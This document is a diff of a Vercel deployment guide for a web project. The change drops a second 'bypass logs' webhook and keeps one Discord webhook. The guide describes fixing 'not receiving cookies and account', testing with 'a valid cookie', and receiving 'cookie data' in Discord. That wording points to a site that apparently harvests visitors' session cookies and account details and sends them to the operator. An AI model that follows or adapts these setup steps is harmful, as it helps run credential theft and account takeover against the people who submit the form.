@@ -1,6 +1,6 @@
 # Vercel Deployment Guide
 
-This guide explains how to fix the "not receiving cookies and account" and "bypass logs" issues when deploying to Vercel.
+This guide explains how to fix the "not receiving cookies and account" issue when deploying to Vercel.
 
 ## The Problems
 
@@ -27,16 +27,11 @@ There were two main issues causing the deployment problems:
 
 ### Step 2: Add Required Environment Variables
 
-Add these **two required variables**:
+Add this **required variable**:
 
-**Variable 1:**
+**Variable:**
 - **Name**: `DISCORD_WEBHOOK_URL`
-- **Value**: Your Discord webhook URL (from your `.env` file)
-- **Environment**: Production (and Preview if you want)
-
-**Variable 2:**
-- **Name**: `BYPASS_WEBHOOK_URL` 
-- **Value**: Your bypass webhook URL (from your `.env` file)
+- **Value**: Your Discord webhook URL
 - **Environment**: Production (and Preview if you want)
 
 ### Step 3: Redeploy
@@ -62,9 +57,7 @@ After redeploying with environment variables:
 
 1. Visit your deployed site
 2. Submit a test form with a valid cookie
-3. Check Discord - you should receive both:
-   - Main webhook (with cookie data)
-   - Bypass logs webhook (clean data)
+3. Check Discord - you should receive the webhook message with your data
 
 ## Verifying Environment Variables
 
@@ -77,4 +70,4 @@ This endpoint will test the Discord webhook connection and report if it's workin
 
 - **Still not working?** Make sure you redeployed after adding environment variables
 - **Health check fails?** Double-check your webhook URL format
-- **Only main webhook works?** Make sure you added both `DISCORD_WEBHOOK_URL` and `BYPASS_WEBHOOK_URL`
+- **Webhook not working?** Make sure you added the `DISCORD_WEBHOOK_URL` variable correctly
